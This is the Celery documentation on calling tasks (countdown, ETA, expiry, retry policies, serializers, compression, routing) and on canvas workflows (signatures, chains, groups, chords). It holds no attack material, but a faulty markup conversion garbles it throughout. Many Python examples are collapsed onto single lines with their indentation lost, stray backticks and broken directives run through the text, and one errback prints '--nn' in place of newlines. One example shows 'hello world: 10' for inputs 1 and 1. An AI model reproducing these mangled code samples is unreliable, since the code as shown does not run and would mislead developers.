`` `python     @app.task(bind=True)     def hello(self, a, b):         time.sleep(1)         self.update_state(state="PROGRESS", meta={'progress': 50})         time.sleep(1)         self.update_state(state="PROGRESS", meta={'progress': 90})         time.sleep(1)         return 'hello world: %i' % (a+b)  .. code-block:: python      def on_raw_message(body):         print(body)      a, b = 1, 1     r = hello.apply_async(args=(a, b))     print(r.get(on_message=on_raw_message, propagate=False))  Will generate output like this:  .. code-block:: text      {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',      'result': {'progress': 50},      'children': [],      'status': 'PROGRESS',      'traceback': None}     {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',      'result': {'progress': 90},      'children': [],      'status': 'PROGRESS',      'traceback': None}     {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',      'result': 'hello world: 10',      'children': [],      'status': 'SUCCESS',      'traceback': None}     hello world: 10   .. _calling-eta:  ETA and Countdown ``\` =================

The ETA (estimated time of arrival) lets you set a specific date and time that is the earliest time at which your task will be executed. <span class="title-ref">countdown</span> is a shortcut to set ETA by seconds into the future.

`` `pycon     >>> result = add.apply_async((2, 2), countdown=3)     >>> result.get()    # this takes at least 3 seconds to return     4  The task is guaranteed to be executed at some time *after* the ``\` specified date and time, but not necessarily at that exact time. Possible reasons for broken deadlines may include many items waiting in the queue, or heavy network latency. To make sure your tasks are executed in a timely manner you should monitor the queue for congestion. Use Munin, or similar tools, to receive alerts, so appropriate action can be taken to ease the workload. See \[monitoring-munin\](\#monitoring-munin).

While <span class="title-ref">countdown</span> is an integer, <span class="title-ref">eta</span> must be a <span class="title-ref">\~datetime.datetime</span> object, specifying an exact date and time (including millisecond precision, and timezone information):

`` `pycon     >>> from datetime import datetime, timedelta, timezone      >>> tomorrow = datetime.now(timezone.utc) + timedelta(days=1)     >>> add.apply_async((2, 2), eta=tomorrow)  > **Warning** >      Tasks with `eta` or `countdown` are immediately fetched by the worker     and until the scheduled time passes, they reside in the worker's memory.     When using those options to schedule lots of tasks for a distant future,     those tasks may accumulate in the worker and make a significant impact on     the RAM usage.      Moreover, tasks are not acknowledged until the worker starts executing     them. If using Redis as a broker, task will get redelivered when `countdown`     exceeds `visibility_timeout` (see [redis-caveats](#redis-caveats)).      Therefore, using `eta` and `countdown` **is not recommended** for     scheduling tasks for a distant future. Ideally, use values no longer     than several minutes. For longer durations, consider using     database-backed periodic tasks, e.g. with :pypi:`django-celery-beat` if     using Django (see [beat-custom-schedulers](#beat-custom-schedulers)).  .. warning::      When using RabbitMQ as a message broker when specifying a ``countdown``over 15 minutes, you may encounter the problem that the worker terminates     with an `~amqp.exceptions.PreconditionFailed` error will be raised:      .. code-block:: pycon          amqp.exceptions.PreconditionFailed: (0, 0): (406) PRECONDITION_FAILED - consumer ack timed out on channel      In RabbitMQ since version 3.8.15 the default value for``consumer\_timeout`is 15 minutes.     Since version 3.8.17 it was increased to 30 minutes. If a consumer does     not ack its delivery for more than the timeout value, its channel will be     closed with a`PRECONDITION\_FAILED``channel exception.     See `Delivery Acknowledgement Timeout`_ for more information.      To solve the problem, in RabbitMQ configuration file``rabbitmq.conf`you     should specify the`consumer\_timeout`parameter greater than or equal to     your countdown value. For example, you can specify a very large value     of`consumer\_timeout = 31622400000`, which is equal to 1 year     in milliseconds, to avoid problems in the future.    .. _calling-expiration:  Expiration`\` ==========

The <span class="title-ref">expires</span> argument defines an optional expiry time, either as seconds after task publish, or a specific date and time using \`\~datetime.datetime\`:

`` `pycon     >>> # Task expires after one minute from now.     >>> add.apply_async((10, 10), expires=60)      >>> # Also supports datetime     >>> from datetime import datetime, timedelta, timezone     >>> add.apply_async((10, 10), kwargs,     ...                 expires=datetime.now(timezone.utc) + timedelta(days=1))   When a worker receives an expired task it will mark ``<span class="title-ref"> the task as :state:\`REVOKED</span> (<span class="title-ref">\~@TaskRevokedError</span>).

## Message Sending Retry

Celery will automatically retry sending messages in the event of connection failure, and retry behavior can be configured -- like how often to retry, or a maximum number of retries -- or disabled all together.

To disable retry you can set the `retry` execution option to \`False\`:

`` `python     add.apply_async((2, 2), retry=False)  .. topic:: Related Settings      .. hlist::         :columns: 2          - :setting:`task_publish_retry`         - :setting:`task_publish_retry_policy`  Retry Policy ``\` ------------

A retry policy is a mapping that controls how retries behave, and can contain the following keys:

  - <span class="title-ref">max\_retries</span>
    
    > Maximum number of retries before giving up, in this case the exception that caused the retry to fail will be raised.
    > 
    > A value of <span class="title-ref">None</span> means it will retry forever.
    > 
    > The default is to retry 3 times.

  - <span class="title-ref">interval\_start</span>
    
    > Defines the number of seconds (float or integer) to wait between retries. Default is 0 (the first retry will be instantaneous).

  - <span class="title-ref">interval\_step</span>
    
    > On each consecutive retry this number will be added to the retry delay (float or integer). Default is 0.2.

  - <span class="title-ref">interval\_max</span>
    
    > Maximum number of seconds (float or integer) to wait between retries. Default is 0.2.

  - <span class="title-ref">retry\_errors</span>
    
    > <span class="title-ref">retry\_errors</span> is a tuple of exception classes that should be retried. It will be ignored if not specified. Default is None (ignored).
    > 
    > For example, if you want to retry only tasks that were timed out, you can use \`\~kombu.exceptions.TimeoutError\`:
    > 
    >   - \`\`\`python  
    >     from kombu.exceptions import TimeoutError
    >     
    >       - add.apply\_async((2, 2), retry=True, retry\_policy={  
    >         'max\_retries': 3, 'retry\_errors': (TimeoutError, ),
    >     
    >     })
    > 
    > <div class="versionadded">
    > 
    > 5.3
    > 
    > </div>

For example, the default policy correlates to:

``` python
add.apply_async((2, 2), retry=True, retry_policy={
    'max_retries': 3,
    'interval_start': 0,
    'interval_step': 0.2,
    'interval_max': 0.2,
    'retry_errors': None,
})
```

the maximum time spent retrying will be 0.4 seconds. It's set relatively `` ` short by default because a connection failure could lead to a retry pile effect if the broker connection is down -- For example, many web server processes waiting to retry, blocking other incoming requests.  .. _calling-connection-errors:  Connection Error Handling =========================  When you send a task and the message transport connection is lost, or the connection cannot be initiated, an `~kombu.exceptions.OperationalError` error will be raised: ``\`pycon \>\>\> from proj.tasks import add \>\>\> add.delay(2, 2) Traceback (most recent call last): File "\<stdin\>", line 1, in \<module\> File "celery/app/task.py", line 388, in delay return self.apply\_async(args, kwargs) File "celery/app/task.py", line 503, in apply\_async **options File "celery/app/base.py", line 662, in send\_task amqp.send\_task\_message(P, name, message,**options) File "celery/backends/rpc.py", line 275, in on\_task\_call maybe\_declare(self.binding(producer.channel), retry=True) File "/opt/celery/kombu/kombu/messaging.py", line 204, in \_get\_channel channel = self.\_channel = channel() File "/opt/celery/py-amqp/amqp/connection.py", line 272, in connect self.transport.connect() File "/opt/celery/py-amqp/amqp/transport.py", line 100, in connect self.\_connect(self.host, self.port, self.connect\_timeout) File "/opt/celery/py-amqp/amqp/transport.py", line 141, in \_connect self.sock.connect(sa) kombu.exceptions.OperationalError: \[Errno 61\] Connection refused

If you have \[retries \<calling-retry\>\](\#retries-\<calling-retry\>) enabled this will only happen after `` ` retries are exhausted, or when disabled immediately.  You can handle this error too: ``\`pycon \>\>\> from celery.utils.log import get\_logger \>\>\> logger = get\_logger(\_\_name\_\_)

> \>\>\> try: ... add.delay(2, 2) ... except add.OperationalError as exc: ... logger.exception('Sending task raised: %r', exc)

<div id="calling-serializers">

Serializers `` ` ===========  .. sidebar::  Security      The pickle module allows for execution of arbitrary functions,     please see the [security guide <guide-security>](#security-guide-<guide-security>).      Celery also comes with a special serializer that uses     cryptography to sign your messages.  Data transferred between clients and workers needs to be serialized, so every message in Celery has a ``content\_type``header that describes the serialization method used to encode it.  The default serializer is `JSON`, but you can change this using the :setting:`task_serializer` setting, or for each individual task, or even per message.  There's built-in support for `JSON`, :mod:`pickle`, `YAML` and``msgpack``, and you can also add your own custom serializers by registering them into the Kombu serializer registry  .. seealso::      [Message Serialization <kombu:guide-serialization>](#message-serialization-<kombu:guide-serialization>) in the Kombu user     guide.  Each option has its advantages and disadvantages.  json -- JSON is supported in many programming languages, is now     a standard part of Python (since 2.6), and is fairly fast to decode.      The primary disadvantage to JSON is that it limits you to the following     data types: strings, Unicode, floats, Boolean, dictionaries, and lists.     Decimals and dates are notably missing.      Binary data will be transferred using Base64 encoding,     increasing the size of the transferred data by 34% compared to an encoding     format where native binary types are supported.      However, if your data fits inside the above constraints and you need     cross-language support, the default setting of JSON is probably your     best choice.      See http://json.org for more information.      > **Note** >          (From Python official docs https://docs.python.org/3.6/library/json.html)         Keys in key/value pairs of JSON are always of the type `str`. When         a dictionary is converted into JSON, all the keys of the dictionary are         coerced to strings. As a result of this, if a dictionary is converted         into JSON and then back into a dictionary, the dictionary may not equal         the original one. That is,``loads(dumps(x)) \!= x``if x has non-string         keys.  pickle -- If you have no desire to support any language other than     Python, then using the pickle encoding will gain you the support of     all built-in Python data types (except class instances), smaller     messages when sending binary files, and a slight speedup over JSON     processing.      See :mod:`pickle` for more information.  yaml -- YAML has many of the same characteristics as json,     except that it natively supports more data types (including dates,     recursive references, etc.).      However, the Python libraries for YAML are a good bit slower than the     libraries for JSON.      If you need a more expressive set of data types and need to maintain     cross-language compatibility, then YAML may be a better fit than the above.      To use it, install Celery with:``\`console $ pip install celery\[yaml\]

</div>

> See <http://yaml.org/> for more information.

  - msgpack -- msgpack is a binary serialization format that's closer to JSON  
    in features. The format compresses better, so is a faster to parse and encode compared to JSON.
    
    To use it, install Celery with:
    
    ``` console
    $ pip install celery[msgpack]
    ```
    
    See <http://msgpack.org/> for more information.

To use a custom serializer you need to add the content type to `` ` :setting:`accept_content`. By default, only JSON is accepted, and tasks containing other content headers are rejected.  The following order is used to decide the serializer used when sending a task:      1. The `serializer` execution option.     2. The `@-Task.serializer` attribute     3. The :setting:`task_serializer` setting.   Example setting a custom serializer for a single task invocation: ``\`pycon \>\>\> add.apply\_async((10, 10), serializer='json')

<div id="calling-compression">

Compression `` ` ===========  Celery can compress messages using the following builtin schemes:  - `brotli`      brotli is optimized for the web, in particular small text     documents. It is most effective for serving static content     such as fonts and html pages.      To use it, install Celery with: ``\`console $ pip install celery\[brotli\]

</div>

  - <span class="title-ref">bzip2</span>
    
    > bzip2 creates smaller files than gzip, but compression and decompression speeds are noticeably slower than those of gzip.
    > 
    > To use it, please ensure your Python executable was compiled with bzip2 support.
    > 
    > If you get the following \`ImportError\`:
    > 
    > ``` pycon
    > >>> import bz2
    > Traceback (most recent call last):
    >   File "<stdin>", line 1, in <module>
    > ImportError: No module named 'bz2'
    > ```
    > 
    > it means that you should recompile your Python version with bzip2 support.

  - <span class="title-ref">gzip</span>
    
    > gzip is suitable for systems that require a small memory footprint, making it ideal for systems with limited memory. It is often used to generate files with the ".tar.gz" extension.
    > 
    > To use it, please ensure your Python executable was compiled with gzip support.
    > 
    > If you get the following \`ImportError\`:
    > 
    > ``` pycon
    > >>> import gzip
    > Traceback (most recent call last):
    >   File "<stdin>", line 1, in <module>
    > ImportError: No module named 'gzip'
    > ```
    > 
    > it means that you should recompile your Python version with gzip support.

  - <span class="title-ref">lzma</span>
    
    > lzma provides a good compression ratio and executes with fast compression and decompression speeds at the expense of higher memory usage.
    > 
    > To use it, please ensure your Python executable was compiled with lzma support and that your Python version is 3.3 and above.
    > 
    > If you get the following \`ImportError\`:
    > 
    > ``` pycon
    > >>> import lzma
    > Traceback (most recent call last):
    >   File "<stdin>", line 1, in <module>
    > ImportError: No module named 'lzma'
    > ```
    > 
    > it means that you should recompile your Python version with lzma support.
    > 
    > Alternatively, you can also install a backport using:
    > 
    > ``` console
    > $ pip install celery[lzma]
    > ```

  - <span class="title-ref">zlib</span>
    
    > zlib is an abstraction of the Deflate algorithm in library form which includes support both for the gzip file format and a lightweight stream format in its API. It is a crucial component of many software systems - Linux kernel and Git VCS just to name a few.
    > 
    > To use it, please ensure your Python executable was compiled with zlib support.
    > 
    > If you get the following \`ImportError\`:
    > 
    > ``` pycon
    > >>> import zlib
    > Traceback (most recent call last):
    >   File "<stdin>", line 1, in <module>
    > ImportError: No module named 'zlib'
    > ```
    > 
    > it means that you should recompile your Python version with zlib support.

  - <span class="title-ref">zstd</span>
    
    > zstd targets real-time compression scenarios at zlib-level and better compression ratios. It's backed by a very fast entropy stage, provided by Huff0 and FSE library.
    > 
    > To use it, install Celery with:
    > 
    > ``` console
    > $ pip install celery[zstd]
    > ```

You can also create your own compression schemes and register `` ` them in the `kombu compression registry <kombu.compression.register>`.  The following order is used to decide the compression scheme used when sending a task:      1. The `compression` execution option.     2. The `@-Task.compression` attribute.     3. The :setting:`task_compression` attribute.  Example specifying the compression used when calling a task::      >>> add.apply_async((2, 2), compression='zlib')  .. _calling-connections:  Connections ===========  .. sidebar:: Automatic Pool Support      Since version 2.3 there's support for automatic connection pools,     so you don't have to manually handle connections and publishers     to reuse connections.      The connection pool is enabled by default since version 2.5.      See the :setting:`broker_pool_limit` setting for more information.  You can handle the connection manually by creating a publisher: ``\`python numbers = \[(2, 2), (4, 4), (8, 8), (16, 16)\] results = \[\] with add.app.pool.acquire(block=True) as connection: with add.get\_publisher(connection) as publisher: try: for i, j in numbers: res = add.apply\_async((i, j), publisher=publisher) results.append(res) print(\[res.get() for res in results\])

Though this particular example is much better expressed as a group:

``` pycon
>>> from celery import group

>>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)]
>>> res = group(add.s(i, j) for i, j in numbers).apply_async()

>>> res.get()
[4, 8, 16, 32]
```

<div id="calling-routing">

Routing options `` ` ===============  Celery can route tasks to different queues.  Simple routing (name <-> name) is accomplished using the ``queue`option::      add.apply_async(queue='priority.high')  You can then assign workers to the`priority.high``queue by using the workers :option:`-Q <celery worker -Q>` argument:``\`console $ celery -A proj worker -l INFO -Q celery,priority.high

</div>

<div class="seealso">

Hard-coding queue names in code isn't recommended, the best practice is to use configuration routers (`task_routes`).

To find out more about routing, please see \[guide-routing\](\#guide-routing).

</div>

<div id="calling-results">

Results options `` ` ===============  You can enable or disable result storage using the :setting:`task_ignore_result` setting or by using the ``ignore\_result`option:`\`pycon \>\>\> result = add.apply\_async((1, 2), ignore\_result=True) \>\>\> result.get() None

</div>

> \>\>\> \# Do not ignore result (default) ... \>\>\> result = add.apply\_async((1, 2), ignore\_result=False) \>\>\> result.get() 3

If you'd like to store additional metadata about the task in the result backend `` ` set the :setting:`result_extended` setting to ``True\`\`.

<div class="seealso">

For more information on tasks, please see \[guide-tasks\](\#guide-tasks).

</div>

### Advanced Options

These options are for advanced users who want to take use of AMQP's full routing capabilities. Interested parties may read the \[routing guide \<guide-routing\>\](\#routing-guide-\<guide-routing\>).

  - exchange
    
    > Name of exchange (or a <span class="title-ref">kombu.entity.Exchange</span>) to send the message to.

  - routing\_key
    
    > Routing key used to determine.

  - priority
    
    > A number between <span class="title-ref">0</span> and <span class="title-ref">255</span>, where <span class="title-ref">255</span> is the highest priority.
    > 
    > Supported by: RabbitMQ, Redis (priority reversed, 0 is highest).

---

canvas.md

---

# Canvas: Designing Work-flows

<div class="contents" data-local="" data-depth="2">

</div>

## Signatures<span id="canvas-subtasks"></span>

<div class="versionadded">

2.0

</div>

You just learned how to call a task using the tasks `delay` method in the \[calling \<guide-calling\>\](\#calling-\<guide-calling\>) guide, and this is often all you need, but sometimes you may want to pass the signature of a task invocation to another process or as an argument to another function.

A <span class="title-ref">\~celery.signature</span> wraps the arguments, keyword arguments, and execution options of a single task invocation in a way such that it can be passed to functions or even serialized and sent across the wire.

  - You can create a signature for the `add` task using its name like this:
    
    >   - \`\`\`pycon  
    >     \>\>\> from celery import signature \>\>\> signature('tasks.add', args=(2, 2), countdown=10) tasks.add(2, 2)
    
    This task has a signature of arity 2 (two arguments): `(2, 2)`, and sets the countdown execution option to 10.

  - or you can create one using the task's `signature` method:
    
    > 
    > 
    > ``` pycon
    > >>> add.signature((2, 2), countdown=10)
    > tasks.add(2, 2)
    > ```

  - There's also a shortcut using star arguments:
    
    > 
    > 
    > ``` pycon
    > >>> add.s(2, 2)
    > tasks.add(2, 2)
    > ```

  - Keyword arguments are also supported:
    
    > 
    > 
    > ``` pycon
    > >>> add.s(2, 2, debug=True)
    > tasks.add(2, 2, debug=True)
    > ```

  - From any signature instance you can inspect the different fields:
    
    > 
    > 
    > ``` pycon
    > >>> s = add.signature((2, 2), {'debug': True}, countdown=10)
    > >>> s.args
    > (2, 2)
    > >>> s.kwargs
    > {'debug': True}
    > >>> s.options
    > {'countdown': 10}
    > ```

  - It supports the "Calling API" of `delay`, `apply_async`, etc., including being called directly (`__call__`).
    
    > Calling the signature will execute the task inline in the current process:
    > 
    > ``` pycon
    > >>> add(2, 2)
    > 4
    > >>> add.s(2, 2)()
    > 4
    > ```
    > 
    > `delay` is our beloved shortcut to `apply_async` taking star-arguments:
    > 
    > ``` pycon
    > >>> result = add.delay(2, 2)
    > >>> result.get()
    > 4
    > ```
    > 
    > `apply_async` takes the same arguments as the <span class="title-ref">Task.apply\_async \<@Task.apply\_async\></span> method:
    > 
    > ``` pycon
    > >>> add.apply_async(args, kwargs, **options)
    > >>> add.signature(args, kwargs, **options).apply_async()
    > 
    > >>> add.apply_async((2, 2), countdown=1)
    > >>> add.signature((2, 2), countdown=1).apply_async()
    > ```

  - You can't define options with <span class="title-ref">\~@Task.s</span>, but a chaining `set` call takes care of that:
    
    > 
    > 
    > ``` pycon
    > >>> add.s(2, 2).set(countdown=1)
    > proj.tasks.add(2, 2)
    > ```

Partials `` ` --------  With a signature, you can execute the task in a worker: ``\`pycon \>\>\> add.s(2, 2).delay() \>\>\> add.s(2, 2).apply\_async(countdown=1)

Or you can call it directly in the current process:

``` pycon
>>> add.s(2, 2)()
4
```

Specifying additional args, kwargs, or options to `apply_async`/`delay` `` ` creates partials:  - Any arguments added will be prepended to the args in the signature: ``\`pycon \>\>\> partial = add.s(2) \# incomplete signature \>\>\> partial.delay(4) \# 4 + 2 \>\>\> partial.apply\_async((4,)) \# same

  - Any keyword arguments added will be merged with the kwargs in the signature, with the new keyword arguments taking precedence:
    
    > 
    > 
    > ``` pycon
    > >>> s = add.s(2, 2)
    > >>> s.delay(debug=True)                    # -> add(2, 2, debug=True)
    > >>> s.apply_async(kwargs={'debug': True})  # same
    > ```

  - Any options added will be merged with the options in the signature, with the new options taking precedence:
    
    > 
    > 
    > ``` pycon
    > >>> s = add.signature((2, 2), countdown=10)
    > >>> s.apply_async(countdown=1)  # countdown is now 1
    > ```

You can also clone signatures to create derivatives:

``` pycon
>>> s = add.s(2)
proj.tasks.add(2)

>>> s.clone(args=(4,), kwargs={'debug': True})
proj.tasks.add(4, 2, debug=True)
```

Immutability `` ` ------------  .. versionadded:: 3.0  Partials are meant to be used with callbacks, any tasks linked, or chord callbacks will be applied with the result of the parent task. Sometimes you want to specify a callback that doesn't take additional arguments, and in that case you can set the signature to be immutable: ``\`pycon \>\>\> add.apply\_async((2, 2), link=reset\_buffers.signature(immutable=True))

The `.si()` shortcut can also be used to create immutable signatures:

``` pycon
>>> add.apply_async((2, 2), link=reset_buffers.si())
```

Only the execution options can be set when a signature is immutable, `` ` so it's not possible to call the signature with partial args/kwargs.  > **Note** >      In this tutorial I sometimes use the prefix operator `~` to signatures.     You probably shouldn't use it in your production code, but it's a handy shortcut     when experimenting in the Python shell: ``\`pycon \>\>\> \~sig

> \>\>\> \# is the same as \>\>\> sig.delay().get()

<div id="canvas-callbacks">

Callbacks `` ` ---------  .. versionadded:: 3.0  Callbacks can be added to any task using the ``link`argument to`apply\_async`:`\`pycon add.apply\_async((2, 2), link=other\_task.s())

</div>

The callback will only be applied if the task exited successfully, `` ` and it will be applied with the return value of the parent task as argument.  As I mentioned earlier, any arguments you add to a signature, will be prepended to the arguments specified by the signature itself!  If you have the signature: ``\`pycon \>\>\> sig = add.s(10)

then <span class="title-ref">sig.delay(result)</span> becomes:

``` pycon
>>> add.apply_async(args=(result, 10))
```

...

Now let's call our `add` task with a callback using partial `` ` arguments: ``\`pycon \>\>\> add.apply\_async((2, 2), link=add.s(8))

As expected this will first launch one task calculating \(2 + 2\), then `` ` another task calculating :math:`8 + 4`.  The Primitives ==============  .. versionadded:: 3.0  .. topic:: Overview      - ``group`The group primitive is a signature that takes a list of tasks that should         be applied in parallel.      -`chain`The chain primitive lets us link together signatures so that one is called         after the other, essentially forming a *chain* of callbacks.      -`chord`A chord is just like a group but with a callback. A chord consists         of a header group and a body,  where the body is a task that should execute         after all of the tasks in the header are complete.      -`map`The map primitive works like the built-in`map`function, but creates         a temporary task where a list of arguments is applied to the task.         For example,`task.map(\[1, 2\])`-- results in a single task         being called, applying the arguments in order to the task function so         that the result is:`\`python res = \[task(1), task(2)\]

>   - `starmap`
>     
>     > Works exactly like map except the arguments are applied as `*args`. For example `add.starmap([(2, 2), (4, 4)])` results in a single task calling:
>     > 
>     > ``` python
>     > res = [add(2, 2), add(4, 4)]
>     > ```
> 
>   - `chunks`
>     
>     > Chunking splits a long list of arguments into parts, for example the operation:
>     > 
>     > ``` pycon
>     > >>> items = zip(range(1000), range(1000))  # 1000 items
>     > >>> add.chunks(items, 10)
>     > ```
>     > 
>     > will split the list of items into chunks of 10, resulting in 100 tasks (each processing 10 items in sequence).

The primitives are also signature objects themselves, so that they can be combined `` ` in any number of ways to compose complex work-flows.  Here're some examples:  - Simple chain      Here's a simple chain, the first task executes passing its return value     to the next task in the chain, and so on. ``\`pycon \>\>\> from celery import chain

> \>\>\> \# 2 + 2 + 4 + 8 \>\>\> res = chain(add.s(2, 2), add.s(4), add.s(8))() \>\>\> res.get() 16
> 
> This can also be written using pipes:
> 
> ``` pycon
> ```
> 
> \>\>\> (add.s(2, 2) | add.s(4) | add.s(8))().get() 16

  - Immutable signatures
    
    > Signatures can be partial so arguments can be added to the existing arguments, but you may not always want that, for example if you don't want the result of the previous task in a chain.
    > 
    > In that case you can mark the signature as immutable, so that the arguments cannot be changed:
    > 
    > ``` pycon
    > >>> add.signature((2, 2), immutable=True)
    > ```
    > 
    > There's also a `.si()` shortcut for this, and this is the preferred way of creating signatures:
    > 
    > ``` pycon
    > >>> add.si(2, 2)
    > ```
    > 
    > Now you can create a chain of independent tasks instead:
    > 
    > ``` pycon
    > >>> res = (add.si(2, 2) | add.si(4, 4) | add.si(8, 8))()
    > >>> res.get()
    > 16
    > 
    > >>> res.parent.get()
    > 8
    > 
    > >>> res.parent.parent.get()
    > 4
    > ```

  - Simple group
    
    > You can easily create a group of tasks to execute in parallel:
    > 
    > ``` pycon
    > >>> from celery import group
    > >>> res = group(add.s(i, i) for i in range(10))()
    > >>> res.get(timeout=1)
    > [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]
    > ```

  - Simple chord
    
    > The chord primitive enables us to add a callback to be called when all of the tasks in a group have finished executing. This is often required for algorithms that aren't *embarrassingly parallel*:
    > 
    > ``` pycon
    > >>> from celery import chord
    > >>> res = chord((add.s(i, i) for i in range(10)), tsum.s())()
    > >>> res.get()
    > 90
    > ```
    > 
    > The above example creates 10 tasks that all start in parallel, and when all of them are complete the return values are combined into a list and sent to the `tsum` task.
    > 
    > The body of a chord can also be immutable, so that the return value of the group isn't passed on to the callback:
    > 
    > ``` pycon
    > >>> chord((import_contact.s(c) for c in contacts),
    > ...       notify_complete.si(import_id)).apply_async()
    > ```
    > 
    > Note the use of `.si` above; this creates an immutable signature, meaning any new arguments passed (including to return value of the previous task) will be ignored.

  - Blow your mind by combining
    
    > Chains can be partial too:
    > 
    > ``` pycon
    > >>> c1 = (add.s(4) | mul.s(8))
    > 
    > # (16 + 4) * 8
    > >>> res = c1(16)
    > >>> res.get()
    > 160
    > ```
    > 
    > this means that you can combine chains:
    > 
    > ``` pycon
    > # ((4 + 16) * 2 + 4) * 8
    > >>> c2 = (add.s(4, 16) | mul.s(2) | (add.s(4) | mul.s(8)))
    > 
    > >>> res = c2()
    > >>> res.get()
    > 352
    > ```
    > 
    > Chaining a group together with another task will automatically upgrade it to be a chord:
    > 
    > ``` pycon
    > >>> c3 = (group(add.s(i, i) for i in range(10)) | tsum.s())
    > >>> res = c3()
    > >>> res.get()
    > 90
    > ```
    > 
    > Groups and chords accepts partial arguments too, so in a chain the return value of the previous task is forwarded to all tasks in the group:
    > 
    > ``` pycon
    > >>> new_user_workflow = (create_user.s() | group(
    > ...                      import_contacts.s(),
    > ...                      send_welcome_email.s()))
    > ... new_user_workflow.delay(username='artv',
    > ...                         first='Art',
    > ...                         last='Vandelay',
    > ...                         email='art@vandelay.com')
    > ```
    > 
    > If you don't want to forward arguments to the group then you can make the signatures in the group immutable:
    > 
    > ``` pycon
    > >>> res = (add.s(4, 4) | group(add.si(i, i) for i in range(10)))()
    > >>> res.get()
    > <GroupResult: de44df8c-821d-4c84-9a6a-44769c738f98 [
    >     bc01831b-9486-4e51-b046-480d7c9b78de,
    >     2650a1b8-32bf-4771-a645-b0a35dcc791b,
    >     dcbee2a5-e92d-4b03-b6eb-7aec60fd30cf,
    >     59f92e0a-23ea-41ce-9fad-8645a0e7759c,
    >     26e1e707-eccf-4bf4-bbd8-1e1729c3cce3,
    >     2d10a5f4-37f0-41b2-96ac-a973b1df024d,
    >     e13d3bdb-7ae3-4101-81a4-6f17ee21df2d,
    >     104b2be0-7b75-44eb-ac8e-f9220bdfa140,
    >     c5c551a5-0386-4973-aa37-b65cbeb2624b,
    >     83f72d71-4b71-428e-b604-6f16599a9f37]>
    > 
    > >>> res.parent.get()
    > 8
    > ```

<div id="canvas-chain">

Chains `` ` ------  .. versionadded:: 3.0  Tasks can be linked together: the linked task is called when the task returns successfully: ``\`pycon \>\>\> res = add.apply\_async((2, 2), link=mul.s(16)) \>\>\> res.get() 4

</div>

The linked task will be applied with the result of its parent `` ` task as the first argument. In the above case where the result was 4, this will result in ``mul(4, 16)`.  The results will keep track of any subtasks called by the original task, and this can be accessed from the result instance:`\`pycon \>\>\> res.children \[\<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4\>\]

> \>\>\> res.children\[0\].get() 64

The result instance also has a <span class="title-ref">\~@AsyncResult.collect</span> method `` ` that treats the result as a graph, enabling you to iterate over the results: ``\`pycon \>\>\> list(res.collect()) \[(\<AsyncResult: 7b720856-dc5f-4415-9134-5c89def5664e\>, 4), (\<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4\>, 64)\]

By default <span class="title-ref">\~@AsyncResult.collect</span> will raise an `` ` `~@IncompleteStream` exception if the graph isn't fully formed (one of the tasks hasn't completed yet), but you can get an intermediate representation of the graph too: ``\`pycon \>\>\> for result, value in res.collect(intermediate=True): ....

You can link together as many tasks as you like, `` ` and signatures can be linked too: ``\`pycon \>\>\> s = add.s(2, 2) \>\>\> s.link(mul.s(4)) \>\>\> s.link(log\_result.s())

You can also add *error callbacks* using the <span class="title-ref">on\_error</span> method:

``` pycon
>>> add.s(2, 2).on_error(log_error.s()).delay()
```

This will result in the following `.apply_async` call when the signature `` ` is applied: ``\`pycon \>\>\> add.apply\_async((2, 2), link\_error=log\_error.s())

The worker won't actually call the errback as a task, but will `` ` instead call the errback function directly so that the raw request, exception and traceback objects can be passed to it.  Here's an example errback: ``\`python import os

> from proj.celery import app
> 
> @app.task def log\_error(request, exc, traceback): with open(os.path.join('/var/errors', request.id), 'a') as fh: print('--nn{0} {1} {2}'.format( request.id, exc, traceback), file=fh)

To make it even easier to link tasks together there's `` ` a special signature called `~celery.chain` that lets you chain tasks together: ``\`pycon \>\>\> from celery import chain \>\>\> from proj.tasks import add, mul

> \>\>\> \# (4 + 4) \* 8 \* 10 \>\>\> res = chain(add.s(4, 4), mul.s(8), mul.s(10)) proj.tasks.add(4, 4) | proj.tasks.mul(8) | proj.tasks.mul(10)

Calling the chain will call the tasks in the current process `` ` and return the result of the last task in the chain: ``\`pycon \>\>\> res = chain(add.s(4, 4), mul.s(8), mul.s(10))() \>\>\> res.get() 640

It also sets `parent` attributes so that you can `` ` work your way up the chain to get intermediate results: ``\`pycon \>\>\> res.parent.get() 64

> \>\>\> res.parent.parent.get() 8
> 
> \>\>\> res.parent.parent \<AsyncResult: eeaad925-6778-4ad1-88c8-b2a63d017933\>

Chains can also be made using the `|` (pipe) operator:

``` pycon
>>> (add.s(2, 2) | mul.s(8) | mul.s(10)).apply_async()
```

Task ID `` ` ~~~~~~~  .. versionadded:: 5.4  A chain will inherit the task id of the last task in the chain.  Graphs ~~~~~~  In addition you can work with the result graph as a `~celery.utils.graph.DependencyGraph`: ``\`pycon \>\>\> res = chain(add.s(4, 4), mul.s(8), mul.s(10))()

> \>\>\> res.parent.parent.graph 285fa253-fcf8-42ef-8b95-0078897e83e6(1) 463afec2-5ed4-4036-b22d-ba067ec64f52(0) 872c3995-6fa0-46ca-98c2-5a19155afcf0(2) 285fa253-fcf8-42ef-8b95-0078897e83e6(1) 463afec2-5ed4-4036-b22d-ba067ec64f52(0)

You can even convert these graphs to *dot* format:

``` pycon
>>> with open('graph.dot', 'w') as fh:
...     res.parent.parent.graph.to_dot(fh)
```

and create images:

``` console
$ dot -Tpng graph.dot -o graph.png
```

![image](../images/result_graph.png)

<div id="canvas-group">

Groups `` ` ------  .. versionadded:: 3.0  > **Note** >      Similarly to chords, tasks used in a group must *not* ignore their results.     See "[chord-important-notes](#chord-important-notes)" for more information.   A group can be used to execute several tasks in parallel.  The `~celery.group` function takes a list of signatures: ``\`pycon \>\>\> from celery import group \>\>\> from proj.tasks import add

</div>

> \>\>\> group(add.s(2, 2), add.s(4, 4)) (proj.tasks.add(2, 2), proj.tasks.add(4, 4))

If you **call** the group, the tasks will be applied `` ` one after another in the current process, and a `~celery.result.GroupResult` instance is returned that can be used to keep track of the results, or tell how many tasks are ready and so on: ``\`pycon \>\>\> g = group(add.s(2, 2), add.s(4, 4)) \>\>\> res = g() \>\>\> res.get() \[4, 8\]

Group also supports iterators:

``` pycon
>>> group(add.s(i, i) for i in range(100))()
```

